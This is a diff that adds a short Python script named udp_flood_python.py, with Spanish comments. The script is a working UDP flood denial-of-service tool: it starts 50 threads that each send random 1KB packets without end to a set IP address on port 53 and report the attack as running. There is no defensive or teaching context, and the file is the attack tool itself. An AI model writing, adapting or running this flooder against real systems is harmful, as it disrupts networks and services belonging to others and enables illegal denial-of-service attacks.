@@ -1,0 +1,26 @@
+# udp_flood_python.py
+import socket
+import threading
+import random
+import time
+
+TARGET_IP = "192.168.1.131"
+TARGET_PORT = 53  # DNS (siempre abierto, o usa 80/445)
+THREADS = 50  # Alta presión
+MESSAGE = random._urandom(1024)  # Datos aleatorios de 1KB
+
+def udp_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        try:
+            sock.sendto(MESSAGE, (TARGET_IP, TARGET_PORT))
+        except:
+            pass
+
+print(f"[+] UDP Flood a {TARGET_IP}:{TARGET_PORT} con {THREADS} hilos")
+for _ in range(THREADS):
+    t = threading.Thread(target=udp_flood)
+    t.daemon = True
+    t.start()
+
+input("[+] Ataque en marcha - Presiona Enter para detener...")
